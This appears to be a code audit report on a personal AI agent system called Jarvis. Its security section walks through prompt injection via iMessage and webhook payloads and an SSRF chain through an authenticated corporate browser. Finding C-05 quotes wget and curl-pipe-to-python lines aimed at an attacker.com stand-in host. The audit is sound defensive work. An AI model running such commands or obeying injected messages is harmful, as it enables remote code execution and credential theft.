# Code Audit Report

**Date**: 2026-03-30
**Project**: Chief of Staff (Jarvis) — `/Users/jasricha/Documents/GitHub/chief_of_staff`
**Audit team**: Orchestrator + 26 chunk agents + 1 security agent + synthesis
**Source lines**: 31,847 | **Test lines**: 43,771 (1.37x ratio) | **Test count**: 1,723 across 137 files

---

## Executive Summary

Chief of Staff (Jarvis) is a capable, feature-complete personal AI orchestration system with genuine engineering discipline: 1,723 tests, no hardcoded secrets, clean module separation, and well-thought-out platform integrations. However, it has **three chained security vulnerabilities that could allow an external attacker to execute autonomous agent commands in the owner's environment**: the iMessage daemon processes messages from any sender by default, webhook payloads are injected verbatim into agent prompts, and the SharePoint download tool accepts arbitrary URLs using an authenticated corporate browser. Beyond security, there are 19 confirmed bugs spanning crashes, data loss, and infinite loops — including a server startup crash on any misconfigured environment variable, a `chunk_text` infinite loop that permanently hangs the server process, and a session brain regex that silently discards workstream state on every load. The codebase is **not safe to run as a daemon with iMessage or webhook channels enabled** until the three security Criticals are addressed.

**Overall Health**: 🔴 Critical — has findings that will cause harm in production

---

## What This Project Does

Chief of Staff is a single-user macOS AI orchestration system deployed as a FastMCP stdio server. It acts as a "chief of staff" by managing expert agents dispatched against calendar, email, Teams, iMessage, OKR data, documents, reminders, and decision/delegation logs — all backed by SQLite and ChromaDB. It runs as both a Claude Code MCP extension and an autonomous background daemon that can receive commands via iMessage, process webhook events, and deliver scheduled briefings.

## Feature Map

| Feature | Chunks | Risk | Health |
|---------|--------|------|--------|
| Memory & Fact Recall | Memory & Storage, MCP Server Core | High | 🟡 |
| Agent Dispatch & Orchestration | Agent System, Orchestration & Playbooks, MCP Server Core | High | 🟡 |
| Calendar Management (Apple + M365) | Calendar & Availability, Graph Client | High | 🟡 |
| Availability & Scheduling | Calendar & Availability, Scheduler & Daemon | High | 🟡 |
| Email Read/Search/Send | Mail & Notifications, Email Routing, Graph Client | Medium | 🟡 |
| iMessage Integration | iMessage & Channels, Utilities & Infrastructure | High | 🔴 |
| Teams Messaging | Teams & Browser, Teams Routing, Graph Client | Medium | 🟡 |
| Document Search & Ingestion | Documents & Search | Medium | 🔴 |
| Scheduled Tasks & Daemon | Scheduler & Daemon, Utilities & Infrastructure | High | 🔴 |
| OKR Tracking & SharePoint | OKR & SharePoint, Teams & Browser | Medium | 🟡 |
| Decision/Delegation/Alert Tracking | Lifecycle Management, Memory & Storage | Medium | 🟡 |
| Proactive Suggestions | Proactive & Skills, Memory & Storage | Low | 🟡 |
| Session Persistence & Brain | Session Management, Memory & Storage | Medium | 🔴 |
| Webhook & Event Processing | Webhooks & Events, Agent System | Medium | 🔴 |
| Identity & Person Enrichment | Identity & Enrichment, Memory & Storage | Medium | 🟢 |
| Formatted Output & Delivery | Formatter & Output, Scheduler & Daemon | Low | 🟡 |
| Security (cross-cutting) | All chunks | High | 🔴 |
| Infrastructure & Utilities | Utilities & Infrastructure, MCP Server Core, Vault/Secrets | Medium | 🟡 |

---

## Findings Register

### 🔴 Critical — Fix Before This Ships

| # | Source | Location | Issue | Impact |
|---|--------|----------|-------|--------|
| C-01 | Security | `chief/imessage_executor.py:44`, `chief/imessage_daemon.py:385` | iMessage daemon processes messages from all senders by default — raw text injected into agent prompt | Unauthorized command execution, data exfiltration |
| C-02 | Security | `webhook/dispatcher.py:157,273` | Webhook payload injected verbatim into agent prompt via string.Template | Attacker-controlled file → full agent takeover |
| C-03 | Security | `mcp_tools/sharepoint_tools.py:52-141` | SharePoint download accepts arbitrary URLs using authenticated corporate browser | SSRF, credential exfiltration |
| C-04 | Scheduler | `scheduler/engine.py:227-241,328-341` | Tasks with corrupt `schedule_config` fire on every daemon tick — infinite retry loop | CPU exhaustion, log spam, repeated handler execution |
| C-05 | Scheduler | `scheduler/handlers.py:42-58` | Custom handler type allows arbitrary code execution — `python`, `wget`, `curl` bypass blocklist | Any MCP client can run arbitrary code |
| C-06 | MCP Core | `config.py:52,102,159,197,198` | 5 unguarded `int()` env-var casts at import time — crash entire server on misconfiguration | Server fails to start; no tool calls possible |
| C-07 | Agent | `agents/base.py:174` | `json.dumps(result)` unguarded — any non-serializable tool result crashes the agent loop | Agent execution fails with no error recovery |
| C-08 | Documents | `documents/ingestion.py:35-41` | `chunk_text` infinite loop when `overlap >= chunk_size` — confirmed hanging server process | Server hangs permanently on one bad ingest call |
| C-09 | Session | `session/brain.py:221` | Workstream status with spaces silently dropped on `load()` — confirmed data loss | Session brain state silently reset after every restart |
| C-10 | iMessage | `channels/routing.py:68-95` | Sensitive-topic regex missing trailing `\b` — `rif` matches "riff", `pip` matches "pipeline" | Normal messages escalated to wrong safety tier |
| C-11 | Webhooks | `webhook/ingest.py:61-63` | No-matching-rules events left `pending` forever by daemon — re-dispatched every tick indefinitely | Unbounded agent dispatch and API cost growth |
| C-12 | Teams | `browser/manager.py:118-134` | `manager.launch()`/`close()` synchronous blocking in async context — up to 75s event loop freeze | All concurrent MCP tool calls blocked during browser start |
| C-13 | Lifecycle | `tools/lifecycle.py:76-97,171-196` | `update_decision`/`update_delegation` skip enum validation — corrupt status values written silently | Decisions/delegations fall out of all normal query views |
| C-14 | Memory | `memory/agent_memory_store.py:24` | `store_agent_memory` INSERT omits `namespace` field — silently discarded | Agent memory namespacing non-functional |
| C-15 | Utilities | `utils/subprocess.py:22-23` | SIGTERM-only cleanup — zombie processes when child ignores signal | Unbounded process accumulation in scheduler daemon |
| C-16 | Proactive | `proactive/engine.py:22-27` | `JARVIS_OUTPUT_DIR` hardcoded to developer's OneDrive path, not `config.py` | 3 test failures on every run; system non-portable |
| C-17 | Calendar | `connectors/graph_client.py:1040-1041` | Recurring event update sends empty `startDate` to Graph API | All recurrence pattern updates return 400 error |
| C-18 | Formatter | `formatter/text.py:7` | ANSI regex leaves `\x1b` ESC byte — garbage chars in email/iMessage delivery | ESC byte renders as `←` in email clients |
| C-19 | Graph Client | `connectors/graph_client.py:247` | Client credentials grant passes delegated scopes — headless daemon auth always fails | All daemon/background M365 authentication broken |

---

**C-01 — iMessage Daemon Prompt Injection (Unauthenticated Command Execution)**

The iMessage daemon reads raw text from `chat.db`, applies only an optional prefix check ("jarvis"), and passes it verbatim as the `instruction` to a Claude API call with access to memory writes, calendar, email, and iMessage send. Critically, `IMESSAGE_DAEMON_ALLOWED_SENDERS` defaults to an empty tuple — meaning when unset, the daemon processes commands from **any iMessage sender**. Anyone who can send an iMessage to this phone number and prefix it with "jarvis" executes arbitrary agent commands. This is the highest-risk finding.

Fix: Require `IMESSAGE_DAEMON_ALLOWED_SENDERS` to be non-empty as a hard prerequisite (refuse to start otherwise). Add a daily rate limit per sender. Consider a configurable secret phrase beyond the public "jarvis" prefix.

---

**C-02 — Webhook Payload Prompt Injection**

`webhook/dispatcher.py:157,273` uses `string.Template` to interpolate the raw `payload` field from ingested webhook JSON files directly into the agent instruction. Any system that can write a `.json` file to the webhook inbox directory controls what the dispatched agent does. This chains with C-01: a malicious iMessage could instruct the agent to write an attacker-controlled payload to the inbox, which is then dispatched as an autonomous agent action.

Fix: Wrap payload in `--- BEGIN EXTERNAL DATA ---\n{payload}\n--- END EXTERNAL DATA ---` delimiters. Validate and size-limit payload content (reject > 50KB). Add a source allowlist.

---

**C-03 — SharePoint Download SSRF via Authenticated Browser**

`download_from_sharepoint` accepts a `sharepoint_url` parameter with no domain validation. The URL is passed to a Playwright browser that is already Okta-authenticated with corporate credentials. An adversarial LLM call (reachable via C-01 or C-02) could pass `http://attacker.com/exfil` as the URL, sending the authenticated session to an attacker-controlled server.

Fix: Validate the URL hostname ends with `.sharepoint.com` or the organization's known domain before proceeding.

---

**C-04 — Scheduler Infinite Retry on Bad Schedule Config**

When `calculate_next_run()` raises (invalid cron stored in DB), the `except` block records `last_run_at` but does NOT advance `next_run_at`. The task remains `next_run_at <= now` and fires on every subsequent daemon tick. Confirmed via runtime probe. The pattern exists in both `_execute_task` and `_execute_task_async` independently.

Fix: On N consecutive failures (suggest 3), set `enabled=False` and `next_run_at=NULL`. Emit a WARNING log.

---

**C-05 — Scheduler Custom Handler Allows Arbitrary Code Execution**

`_validate_custom_command` blocks shell metacharacters and specific commands (`rm`, `sudo`), but allows: `python /tmp/evil.py`, `wget http://attacker.com/payload`, `curl http://attacker.com/shell | python3`, `./local_script.sh`. Runtime-confirmed. Any Claude Code session using this MCP server can create a scheduled task to run arbitrary code.

Fix: Restrict `custom` handlers to a `scripts/` subdirectory allowlist, or require an explicit admin-approved command whitelist in config.

---

**C-06 — 5 Unguarded int() Casts in config.py**

Lines 52, 102, 159, 197, 198 cast environment variables with `int(os.environ.get(..., "default"))` without `try/except ValueError`. A single non-integer env var causes a `ValueError` at import time, crashing the entire MCP server before any tool can execute. Nearby lines have proper guards — these five were missed during feature additions.

Fix: Wrap each with `try: ... except ValueError: <default>`.

---

**C-07 — Agent Loop Crash on Non-Serializable Tool Result**

`agents/base.py:174` calls `json.dumps(result)` without a try/except. If any tool handler returns a non-JSON-serializable object (e.g., a raw `datetime`), the entire `execute()` loop crashes with `TypeError` mid-run, returning no result to the caller.

Fix: `try: json.dumps(result) except (TypeError, ValueError): str(result)`.

---

**C-08 — chunk_text Infinite Loop**

`documents/ingestion.py:35-41`: when `overlap >= chunk_size`, `start = end - overlap` never advances. Confirmed via runtime probe: `chunk_size=10, overlap=10` hangs indefinitely. Production defaults (500/50) are safe, but there is no guard — one bad MCP call hangs the server process permanently with no timeout or escape path.

Fix: `assert overlap < chunk_size` at function entry, or `start = max(start + 1, end - overlap)` as a floor guard.

---

**C-09 — Session Brain Workstream Silent Data Loss**

`session/brain.py:221` uses regex `(\S+)` for the workstream status field. Any workstream saved with a status containing a space ("in progress", "on hold", "needs review") is written to the markdown file correctly but **silently dropped** on `load()`. Confirmed via runtime probe: write → save → load → `[]`. The session brain is the primary cross-session durability mechanism; this means the state resets on every restart.

Fix: Change `(\S+)` to `(\S+(?:\s+\S+)*)` in `_RE_WORKSTREAM`, and add validation at `add_workstream()`.

---

**C-10 — Sensitive Topic Regex False Positives**

`channels/routing.py:68-95`: `\b(?:rif)` matches `riff` and `riffing`. `\b(?:pip)` matches `pipeline`. Confirmed: `is_sensitive_topic("riff raff")` → `True`, `is_sensitive_topic("pipeline")` → `True`. Normal business messages containing these words are escalated to a higher safety tier, blocking auto-send of routine messages.

Fix: Use `\brif\b` and `\bpip\b` word-boundary anchors.

---

**C-11 — Webhook No-Match Events Loop Forever**

`dispatch_pending_events` in `webhook/ingest.py` leaves events `status=pending` when no rules match, causing re-queue on every daemon tick indefinitely. The MCP tool path (`dispatch_webhook_event`) correctly marks them `processed`. Events with no matching rules accumulate, triggering repeated agent dispatch and growing API costs without bound.

Fix: Mark events `processed` (or a new `no_match` terminal state) after one pass with no rules.

---

**C-12 — Teams Browser Blocks Async Event Loop**

`browser/manager.py:118-134`: `manager.launch()` calls `time.sleep(0.5)` and `urllib.request.urlopen(timeout=2)` up to 30 times in a synchronous loop, run directly inside the async `open_teams_browser` MCP tool handler without `run_in_executor`. Worst case: 75 seconds of event loop blocking. During this window, all concurrent MCP tool calls are frozen.

Fix: Wrap `launch()` and `close()` in `asyncio.get_event_loop().run_in_executor(None, ...)`.

---

**C-13 — Lifecycle Status Enum Bypass on Update**

`create_decision` calls `_validate_enum(status, DecisionStatus, "status")`. `update_decision` and `update_delegation` do not. Runtime-confirmed: `ms.update_decision(id, status="done")` silently stores the invalid value. The record then falls out of all normal query paths permanently.

Fix: Add `_validate_enum(status, DecisionStatus, "status")` before the update call in both functions.

---

**C-14 — Agent Memory Namespace Silently Dropped**

`AgentMemoryStore.store_agent_memory` INSERT omits the `namespace` column. Any call with `AgentMemory(namespace="x")` discards the namespace silently. `store_shared_memory` handles it correctly.

Fix: Add `namespace` to the INSERT column list and parameter tuple.

---

**C-15 — Zombie Process Accumulation**

`utils/subprocess.py:22-23`: after `os.killpg(SIGTERM)`, `proc.wait(timeout=5)` can raise `TimeoutExpired` if the child ignores SIGTERM. The second exception propagates to the caller but the process is never SIGKILLed. In the scheduler daemon this creates unbounded zombie accumulation over time.

Fix: Catch the second `TimeoutExpired` and escalate to `os.killpg(SIGKILL)`.

---

**C-16 — Hardcoded Developer Path in Proactive Engine**

`proactive/engine.py:22-27` defines `JARVIS_OUTPUT_DIR = "/Users/jasricha/Library/CloudStorage/OneDrive-CHGHealthcare/Jarvis"` as a module-level constant — not from `config.py`. This causes 3 test failures on every test run (tests receive unexpected stale-document suggestions from the live filesystem), and makes the stale-document check non-portable.

Fix: Move to `config.py` with an env-var override.

---

**C-17 — Recurring Event Update Fails with Empty startDate**

`connectors/graph_client.py:1040-1041`: `update_calendar_event` patches `recurrence.range.startDate` only when `"start" in kwargs`. `_build_recurrence_payload` sets `"startDate": ""` as placeholder. Any call to update a recurring event's pattern (interval, days) without simultaneously passing a start date sends `startDate=""` to Graph, which returns a 400 error.

Fix: Populate `startDate` from the existing event's start date when recurrence is being updated but start is not changed.

---

**C-18 — ANSI Regex Leaves ESC Bytes in Email Output**

`formatter/text.py:7`: regex `r"\[[0-9;]*m"` strips `[32m` but leaves the preceding `\x1b` ESC byte. `strip_ansi("\x1b[32mGreen\x1b[0m")` returns `"\x1bGreen\x1b"`. In plain-text email and iMessage delivery, the ESC byte renders as `←` or garbage in most email clients.

Fix: Change pattern to `r"\x1b\[[0-9;]*m"`.

---

**C-19 — Graph Client Credentials Scope Bug (Daemon Auth Broken)**

`connectors/graph_client.py:247`: `acquire_token_for_client(scopes=self._scopes)` passes delegated scopes like `["Chat.Read", "Mail.Send"]`. The client credentials grant requires `["https://graph.microsoft.com/.default"]`. This means all headless/daemon M365 authentication is broken whenever `_is_confidential` is `True`.

Fix: When `_is_confidential` is True, override scopes to `["https://graph.microsoft.com/.default"]`.

---

### 🟡 Warning — Fix Before Next Release

| # | Source | Location | Issue |
|---|--------|----------|-------|
| W-01 | Memory | `memory/fact_store.py:113-128` | FTS search returns empty list silently for all-keyword queries ("OR", "AND") |
| W-02 | Memory | `memory/store.py:448-479` | Migration errors swallowed with bare `pass` — disk full and lock errors invisible |
| W-03 | Memory | `memory/scheduler_store.py:123-126` | Corrupted `delivery_config` silently delivers nowhere — no warning logged |
| W-04 | Memory | `context`/`tool_usage_log`/`agent_api_log` tables | No TTL or pruning — unbounded growth in production |
| W-05 | Calendar | `connectors/providers/apple_provider.py:19` | `is_connected()` always returns `True` — router believes Apple available even when EventKit absent |
| W-06 | Calendar | Router vs tool layer | Two `_looks_work_calendar` implementations with divergent keyword lists — routing inconsistency |
| W-07 | Calendar | `mcp_tools/calendar_tools.py:239` | Multiple alarms silently truncated to first on Graph path |
| W-08 | Mail | `apple_mail/mail.py:105` | `get_messages` returns oldest 25, not newest 25 — wrong emails for primary use case |
| W-09 | Mail | `mcp_tools/mail_tools.py`, `connectors/graph_client.py` | BCC silently dropped on Graph send; reply_all/cc/bcc dropped on Graph reply |
| W-10 | Mail | `mail_tools.py:196-198,248-250` | Graph permanent auth failure silently falls back to Apple Mail — misconfiguration invisible |
| W-11 | iMessage | `chief/imessage_daemon.py:360` | `parse_local_date_to_epoch` unguarded — malformed `date_local` aborts ingest tick, loops indefinitely |
| W-12 | iMessage | `chief/imessage_daemon.py:376-407` | Replies always go to `IMESSAGE_DAEMON_REPLY_HANDLE`, not originating sender |
| W-13 | Teams | `teams_browser_tools.py:706-788` | 50 chats × 25 messages always fetched regardless of `limit` — 1,250 API calls for `limit=5` |
| W-14 | Teams | `teams_browser_tools.py:541-547` | `_pending_graph_message` race — concurrent `post_teams_message` calls overwrite each other |
| W-15 | Teams | `_graph_send_message`, `find_chat_by_members` | Display name first-substring-match, `issubset` member matching — message can reach wrong recipient |
| W-16 | Teams | `connectors/graph_client.py:798` | `update_chat_topic` uses `/me/chats/{id}` — Graph returns 405; feature silently broken |
| W-17 | Scheduler | `alert_evaluator.py:163-165,211-213` | MemoryStore not closed on early return or exception — connection leak |
| W-18 | Scheduler | `scheduler_tools.py:248-266` | Manual `run_scheduled_task` doesn't pre-advance `next_run_at` — double execution risk |
| W-19 | Documents | `ingestion.py:167` | Source key uses basename only — `delete_by_source` deletes chunks from all same-named files |
| W-20 | Documents | `ingestion.py:149-176` | Re-ingesting changed file accumulates stale chunks — search returns outdated content |
| W-21 | Documents | `document_tools.py:107,136` | Two hardcoded absolute paths to developer's personal OneDrive — non-portable |
| W-22 | Documents | `document_tools.py:148-165` | `archive_document` moves file before deleting ChromaDB record — partial failure leaves dangling reference |
| W-23 | OKR | `okr/store.py:54-59` | `load_latest()` uses `**kwargs` reconstruction — any schema change corrupts all existing snapshots |
| W-24 | OKR | `mcp_tools/okr_tools.py:14-34` | `_format_okr_results` is dead code — reads `"results"` key that never exists; `"formatted": ""` always |
| W-25 | Lifecycle | `tools/lifecycle.py:360-406` | `check_alerts` double-counts items when alert rules overlap hardcoded checks |
| W-26 | Orchestration | `mcp_tools/playbook_tools.py:121` | `ctx if ctx else None` treats empty dict `{}` as None — all conditional workstreams silently skipped |
| W-27 | Orchestration | `playbook_executor.py:101` + `synthesis.py:40` | `"partial"` status treated as failure in synthesis — if all partial, synthesis skipped entirely |
| W-28 | Orchestration | `playbook_executor.py:55` | No per-workstream timeout — hung agent holds semaphore slot forever |
| W-29 | Session | `session/manager.py:138` | `flush(priority_threshold="key_facts")` silently also flushes action_items — undocumented |
| W-30 | Session | `session_tools.py:67` | Context window percentage hardcoded at 150K tokens; deployed model has 200K |
| W-31 | Webhooks | `event_rule_tools.py:119` | `update_event_rule` ignores `delivery_channel=""` — no way to clear a set delivery channel |
| W-32 | Webhooks | `webhook/dispatcher.py:204` | `deliver_result` called synchronously in async dispatch — blocks event loop on SMTP delivery |
| W-33 | Proactive | `skills/pattern_detector.py:74` | Confidence scoring `count/max_count` — secondary clusters always below threshold in skewed distributions |
| W-34 | Proactive | `proactive_tools.py:82-89` | `dismiss_suggestion` returns success even when persistence fails — item reappears on next call |
| W-35 | Identity | `identity_tools.py:32-88` | Inner `try/except` pre-empts `@tool_errors` decorator — store exceptions leave no log trace |
| W-36 | Identity | `enrichment.py:93-103` | Email enrichment uses Apple Mail INBOX only — no M365 email source wired |
| W-37 | Hooks | `hooks/registry.py:87` | Async hook callbacks silently return unawaited coroutine — async hooks do nothing |
| W-38 | Hooks | `hooks/builtin.py:17` | `_timing_store` dict leaks on before/after mismatch — unbounded growth in daemon |
| W-39 | Graph Auth | `graph_client.py:421-425` | 401 retry re-acquires same stale token from cache — retry is effectively a no-op |
| W-40 | Graph Auth | `graph_client.py:292-374` | OAuth auth code flow binds to fixed port 8400 — `OSError` if port in use |
| W-41 | Config | `mcp_server.py:226-228` | `graph_client.close()` not try/excepted in finally — exception blocks `memory_store.close()` |
| W-42 | Config | `graph_client.py` (MCP context) | `interactive=True` default — token expiry triggers blocking device-code flow on stdio transport |
| W-43 | Vault | `vault/keychain.py:46-56,86-97` | No subprocess timeout on `security` CLI calls — Keychain hang freezes MCP server startup |

---

### 🟢 Improvements — When You Have Capacity

| # | Area | Observation |
|---|------|------------|
| I-01 | Memory | Hybrid search scores (BM25 + cosine + flat 0.5) not normalized — ranking degrades silently at scale |
| I-02 | Memory | No `ORDER BY` on `list_delegations`, `list_decisions`, `list_alert_rules` — non-deterministic ordering |
| I-03 | Agent | `get_tools()` called on every tool call — cache at `execute()` start to eliminate 50-100x redundant builds |
| I-04 | Agent | `capabilities/registry.py` 1,155 lines of mostly static data — migrate to YAML file |
| I-05 | Calendar | `resolve_calendar_id` cache never invalidated during session — stale after calendar rename |
| I-06 | iMessage | `_record_observations()` opens one SQLite connection per observation tuple — batch instead |
| I-07 | Teams | `_graph_resolve_chat` is 160 lines with 3 nested loops — extract to `connectors/` |
| I-08 | Scheduler | `_execute_task` and `_execute_task_async` are ~80-line near-duplicates — already causing divergence |
| I-09 | Scheduler | `ProactiveSuggestionEngine` re-created on every daemon tick — instantiate once |
| I-10 | Documents | `list_sources` fetches entire collection to count — O(n) memory for what should be an aggregation |
| I-11 | Formatter | `decisions_to_summary` returns `"0 pending"` (truthy) when no pending — renders empty section |
| I-12 | Formatter | `format_brief` passes `**parsed` to `render_daily` — unknown LLM-supplied keys raise TypeError |
| I-13 | Graph | No retry on 5xx responses — `GraphTransientError` name implies retry was intended |
| I-14 | Graph | `Retry-After` parsed as `int` without error handling — RFC 7231 allows date strings |
| I-15 | Graph Teams | OData filter values not URL-encoded — `&`, `%`, `#` in display names break URL parsing |
| I-16 | Config | `M365_CLIENT_SECRET` stored as module-level string attribute — never consumed; remove it |
| I-17 | Vault | None results cached — subsequent env var updates ignored until `clear_secret_cache()` |
| I-18 | Teams/Downloads | `_try_ui_download` never deletes source file from `~/Downloads` — unbounded accumulation |
| I-19 | Skills | `suggested_capabilities` field written but never read by `auto_create_skill` — dead data |
| I-20 | Agent | `triage.py` creates new `anthropic.Anthropic` client per call — no connection pooling |

---

### 💀 Dead Weight — Safe to Remove

| Item | Why unused |
|------|-----------|
| `mcp_tools/okr_tools.py:14-34` `_format_okr_results` | Reads `"results"` key that never exists in `OKRStore.query()` output |
| `config.py:165` `M365_CLIENT_SECRET` attribute | Never read by any module; `GraphClient` independently calls `get_secret()` |
| `scheduler/alert_evaluator.py:13` `sys.path.insert` | Launchd-era artifact; daemon now handles this module directly |
| `mcp_tools/api_usage_tools.py` inner `try/except` blocks | Pre-empts `@tool_errors` decorator; silences logging |
| `delivery/__init__.py` `_build_template_vars` import | Private helper re-exported via `__init__`; no external consumer |
| `connectors/graph_client.py` `_is_confidential = True` branch | `_is_confidential` always `False` in production; `_auth_code_flow` dead code |
| `memory/webhook_store.py:99` `import json as _json` inside `create_event_rule` | `_json` never used in function body |
| `webhook/receiver.py` `__main__` block | Exact duplicate of `webhook/ingest.py:204-224` |
| `mcp_tools/skill_tools.py` `suggested_capabilities` field writes | Written but never read by `auto_create_skill` — dead data in DB |

---

## Chunk Health Summary

| Chunk | Status | Test Result | Key Finding |
|-------|--------|-------------|-------------|
| MCP Server Core | 🟡 | 161/161 passed | 5 unguarded int() casts crash server at startup |
| Memory & Storage | 🟡 | 117/117 passed | Namespace silently dropped in store_agent_memory |
| Agent System | 🟡 | 210/210 passed | json.dumps() crash kills agent loop on non-serializable result |
| Calendar & Availability | 🟡 | 229/229 passed | Recurring event update sends empty startDate to Graph; is_connected() always True |
| Mail & Notifications | 🟡 | 104/104 passed | get_messages returns oldest-first; BCC silently dropped on Graph |
| iMessage & Channels | 🔴 | 151/151 passed | Regex false positives block normal messages; sec critical prompt injection |
| Teams & Browser | 🟡 | 180/180 passed | 75s async event loop block; display name sends to wrong recipient |
| Documents & Search | 🔴 | 19/19 passed | chunk_text infinite loop confirmed; stale chunk accumulation |
| Scheduler & Daemon | 🔴 | 148/148 passed | Infinite retry on bad config; arbitrary code execution via custom handler |
| OKR & SharePoint | 🟡 | 69/69 passed (1 skip) | Schema-unguarded load_latest breaks on any model field addition |
| Lifecycle Management | 🟡 | 53/53 passed | update_decision/update_delegation bypass enum validation |
| Orchestration & Playbooks | 🟡 | 78/78 passed | Empty context dict skips all conditional workstreams silently |
| Proactive & Skills | 🔴 | 91/94 passed (3 fail) | Hardcoded developer path causes 3 test failures on every run |
| Session Management | 🔴 | 140/140 passed | Multi-word workstream status silently lost on every load |
| Webhooks & Events | 🔴 | 53/53 passed | No-match events re-dispatched forever by daemon |
| Identity & Enrichment | 🟢 | 53/53 passed | Inner try/except silences identity store errors from logs |
| Formatter & Output | 🟡 | 75/75 passed | ANSI regex leaves ESC bytes in email; "0 pending" renders false section |
| Utilities & Infrastructure | 🟡 | 166/166 passed | SIGTERM-only cleanup creates zombies; async hooks silently fire nothing |
| Graph Client (Core/Auth/Teams) | 🟡 | Solid coverage | Client credentials scope bug; update_chat_topic uses wrong endpoint |
| Email Routing | 🟡 | Covered | BCC and reply_all silently dropped on Graph path |
| Teams Routing | 🟡 | Covered | First-substring display name match delivers to wrong recipient |
| Vault/Secrets | 🟡 | Good coverage | No subprocess timeout on Keychain CLI calls |
| Config & Wiring | 🟡 | Covered | graph_client.close() not guarded in finally block |

**Test failure count at time of audit**: 3 (all in proactive chunk — single root cause: hardcoded developer path in `proactive/engine.py`)

---

## Security Summary

This codebase has meaningful security awareness: AppleScript escaping, confirm-send gates, extension allowlists, Keychain-backed secrets, no hardcoded credentials, path traversal guards on document ingest, `yaml.safe_load()` throughout, and SSL verification never disabled. However, three Critical findings create an attack chain that could enable an external attacker to achieve autonomous command execution.

The most dangerous scenario: attacker sends an iMessage starting with "jarvis" (C-01, default configuration) → agent is invoked → agent is instructed to call `download_from_sharepoint` with an attacker-controlled URL (C-03) → corporate Okta session fetches from attacker's server, potentially exfiltrating the authenticated session token. SEC-CRIT-02 means any system that can write to the webhook inbox directory can control what the dispatched agent does.

**Auth assessment**: MSAL handles M365 token lifecycle correctly; Keychain-backed storage is sound. No HTTP auth surface (stdio transport). The iMessage and webhook channels are the effective auth boundary — and both have Critical gaps that must be closed before the daemon is run.

**Injection risk**: Three critical prompt injection paths (iMessage, webhook, SharePoint URL). No SQL injection found. FTS5 queries properly sanitized. AppleScript escaping correctly implemented. OData injection correctly handled.

**Secrets exposure**: No hardcoded secrets in source. `config.M365_CLIENT_SECRET` stored as module-level string attribute — never read by any consumer, but should be removed.

**Dependency vulns**: `pip-audit` not available in audit environment. A full `pip-audit` run is required as part of CI.

---

## Cross-Cutting Issues

### Systemic Patterns

**Silent exception swallowing (41 instances, 8+ distinct chunks)**: The most pervasive pattern. Memory stores (8 instances), Graph client (4 instances), agent base (2 instances), browser navigation (7 instances), proactive engine, orchestration, and resource handlers all use `except ...: pass` with no logging. Some (migration "column already exists") are correct; most are production failures becoming invisible. A project-wide rule of "always add at least `logger.debug(...)` before any `pass` in an exception handler" would catch future regressions.

**Hardcoded developer paths (3+ locations)**: `proactive/engine.py`, `mcp_tools/document_tools.py` (two paths), and several test files embed absolute paths to the developer's personal OneDrive. The project's own `config.py` convention is not followed. This causes test failures and makes the system non-portable.

**Duplicate implementation of same logic (3+ chunks)**: `_looks_work_calendar` exists independently in `connectors/router.py` and `mcp_tools/calendar_tools.py` with divergent keyword lists (router omits "chg"). `_execute_task` and `_execute_task_async` are ~80-line near-duplicates that have already diverged (timeout guard only in async path). `_parse_json_config` defined identically in `handlers.py` and `morning_brief.py`. Duplication is consistently causing bugs.

**Deprecated config variable still active**: `TEAMS_POSTER_BACKEND` was deprecated but is still consumed by `_get_backend()` in three call sites. `TEAMS_SEND_BACKEND` is the intended replacement but the migration is incomplete, creating two config paths with different defaults that can drift.

### Dead Code

See the Dead Weight section above. Key items: `_format_okr_results` reads a dict key that never exists; `config.M365_CLIENT_SECRET` is never read by any consumer; `_auth_code_flow` is unreachable because `_is_confidential` is always `False` in production; the webhook receiver's `__main__` block is an exact duplicate of the ingest module's.

### Test Coverage

Exceptional overall: 1.37x test-to-source ratio, 1,723 tests, all passing except 3 (single root cause). Specific gaps worth addressing:

- `delete_document` and `archive_document` MCP tool wrappers have no test coverage at the MCP layer (underlying store methods are tested)
- Graph auth code flow internals (HTTP server, threading, code exchange) untested
- `stale_backup` alert type branch in lifecycle has zero test coverage
- `refresh_session_context` rate-limiting (30-second cooldown) has no test
- Combined `total_alerts` value in `check_alerts` when hardcoded and rule-based checks overlap is untested
- No test verifies display-name ambiguity in `_graph_send_message` (multiple chats matching)

### Interface Integrity

- Calendar dual-write path calls `calendar_store._upsert_ownership(...)` (private method) — bypasses the `UnifiedCalendarService` public interface
- Orchestration: `playbook_executor.py` produces `"partial"` status; `synthesize_results` only recognizes `"success"` — cross-module contract violated and untested
- Memory: `search_facts_hybrid` combines FTS5 BM25 scores, vector cosine (0-1), and flat 0.5 without normalization — ranking becomes meaningless at scale
- Email: `GraphClient.send_mail()` and `reply_mail()` lack `bcc` and `reply_all` parameters — tool layer passes them, they silently disappear

---

## Vibe-Code Assessment

This project shows genuine authorial understanding in most areas but has clear signs of iterative AI-assisted construction across multiple sessions: duplicate implementations of the same logic (worked for the current session, no cleanup), incomplete migrations (deprecated `TEAMS_POSTER_BACKEND` still active, `ClaudeM365Bridge` subprocess coexisting with newer `GraphClient`), and a few abstractions that were scaffolded but never wired (`_format_okr_results`, `suggested_capabilities`, `_is_confidential` branch).

**Coherent and intentional**: Memory store architecture (facade pattern, migration helpers), agent tool-use loop, capabilities registry design, channel routing safety tiers, availability analysis, confirm-send gate pattern.

**Suspect**: `_format_okr_results` (generated but wrong key), `identity_tools.py` double error handlers (decorator-then-try/except conflict — decorator is dead weight), `_execute_task`/`_execute_task_async` duplication (same code written twice in the same file), `proactive/engine.py` hardcoded path.

**Verdict**: Salvageable as-is — the architecture is sound and the test suite is excellent. The issues are targeted bugs and incomplete migrations, not structural rot.

---

## Overall Verdict

Jarvis is a genuinely sophisticated piece of software: 31K lines of well-structured Python, 1,700+ tests, real platform integrations, and thoughtful design patterns throughout. The test suite alone puts it ahead of most production systems. However, the iMessage daemon should not be run with current defaults on a device receiving messages from anyone other than its owner — empty `IMESSAGE_DAEMON_ALLOWED_SENDERS` means any iMessage starting with "jarvis" executes as a full agent command with access to memory, calendar, and email. Fix that one env-var gate and the immediate security risk drops significantly. Beyond security, the most impactful fixes for daily use are: the `config.py` int() crash (C-06, one-liner per variable), the session brain data loss (C-09, regex fix), the recurring event update failure (C-17), the chunk_text infinite loop guard (C-08), and the orchestration context-coercion bug (W-26). None of these require architectural rethinking. The project is in good shape — it needs a focused remediation pass, not a rewrite.
